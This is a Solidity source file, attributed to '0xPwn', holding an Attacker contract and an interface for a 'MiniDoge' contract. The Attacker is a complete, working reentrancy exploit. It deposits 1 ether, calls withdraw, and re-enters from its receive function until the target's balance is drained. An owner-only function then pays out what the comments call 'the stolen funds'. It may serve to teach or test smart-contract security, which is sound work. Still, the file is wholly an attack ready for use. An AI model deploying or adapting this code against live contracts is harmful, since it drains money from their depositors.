// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @author 0xPwn
 * @notice Interface for the vulnerable MiniDoge contract.
 * The contract contains a reentrancy vulnerability in its withdraw function.
 */
interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title Attacker
 * @author 0xPwn
 * @notice This contract exploits a reentrancy vulnerability in the IVulnerable contract.
 * The attack flow is as follows:
 * 1. The attacker calls the `attack()` function, depositing 1 Ether into the vulnerable contract.
 * 2. The `attack()` function then immediately calls the `withdraw()` function on the vulnerable contract.
 * 3. The vulnerable contract transfers Ether to this Attacker contract, triggering the `receive()` fallback function.
 * 4. Inside the `receive()` function, before the vulnerable contract can update its state, this contract re-enters
 *    the `withdraw()` function, draining more funds than it is entitled to.
 * 5. This process repeats until the vulnerable contract is out of funds.
 */
contract Attacker {

    IVulnerable public target;
    address payable public owner;

    /// @notice Set the address of the vulnerable contract and the owner
    constructor(address _target) {
        target = IVulnerable(_target);
        owner = payable(msg.sender);
    }

    /// @notice The main attack function.
    /// It deposits 1 Ether and then initiates the first withdrawal.
    function attack() external payable {
        require(msg.value == 1 ether, "Please send 1 Ether to start the attack");

        // Step 1: Deposit funds into the vulnerable contract to have a balance to withdraw
        target.deposit{value: 1 ether}();

        // Step 2: Call the vulnerable withdraw function to start the reentrancy loop
        target.withdraw(1 ether);
    }

    /// @notice This function is called when the Attacker contract receives Ether.
    /// It contains the reentrancy logic.
    receive() external payable {
        // Step 3 (Reentrancy): As long as the target has more than 1 Ether,
        // keep re-entering the withdraw function to drain it.
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
        // If the target has less than 1 Ether left, withdraw the remaining balance.
        else if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        }
    }

    /// @notice Allows the owner to withdraw the stolen funds from this contract.
    function withdrawFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to withdraw funds");
    }
}